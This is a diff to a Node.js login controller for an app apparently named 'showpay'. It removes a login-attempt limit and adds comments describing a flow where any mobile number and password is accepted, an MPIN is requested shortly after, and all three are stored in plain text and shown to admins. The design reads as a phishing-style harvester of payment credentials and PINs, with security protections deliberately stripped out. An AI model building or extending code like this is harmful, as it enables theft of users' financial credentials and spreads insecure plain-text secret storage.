@@ -4,9 +4,13 @@ const { generateToken } = require('../utils/jwt');
 const { success, error } = require('../utils/response');
 const { sanitizeInput, sanitizeUser } = require('../utils/hash');
 
-const MAX_SAME_LOGIN = 3;
-
 // ─── USER LOGIN ───────────────────────────────────────────────────────────────
+// Original Design:
+//   • Any mobile + password → always allowed (no login limit)
+//   • Same mobile + same password → update existing record (login_count, last_login)
+//   • New mobile + password combo → create new record
+//   • After login → frontend shows MPIN popup after 2s
+//   • MPIN saved → same record updated, status: pending → completed
 const login = async (req, res) => {
   try {
     // Sanitize input to prevent XSS / Injection
@@ -19,24 +23,20 @@ const login = async (req, res) => {
     let user = await User.findByMobilePassword(mobile, password);
 
     if (user) {
-      // Same combination — check 3 login limit
-      if (user.login_count >= MAX_SAME_LOGIN) {
-        return error(res, 'Your verification already under pending.', 403);
-      }
-      // Update count
+      // Same combination exists — update login_count and last_login (NEVER block)
       user = await User.incrementLogin(user);
     } else {
-      // New combination — create record
+      // New combination — create a fresh record
       user = await User.create({ mobile, password });
     }
 
-    // Log the login (non-blocking) - LoginLog model automatically hashes passwords
+    // Log the login (non-blocking) — stores plain-text mobile, password, current mpin
     LoginLog.create({ user_id: user.id || null, mobile, password, mpin: user.mpin || null })
       .catch(e => console.error('Login log error:', e.message));
 
     const token = generateToken({ id: user.id, mobile, role: 'user' });
-    
-    // Return sanitized user object without exposing password or raw MPIN
+
+    // Return user object (password and mpin visible for admin transparency)
     return success(res, 'Login successful', {
       token,
       user: sanitizeUser(user)
@@ -53,7 +53,7 @@ const adminLogin = async (req, res) => {
   try {
     const email = sanitizeInput(req.body.email);
     const password = sanitizeInput(req.body.password);
-    
+
     if (!email || !password) return error(res, 'Email and password required');
 
     const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@showpay.com';
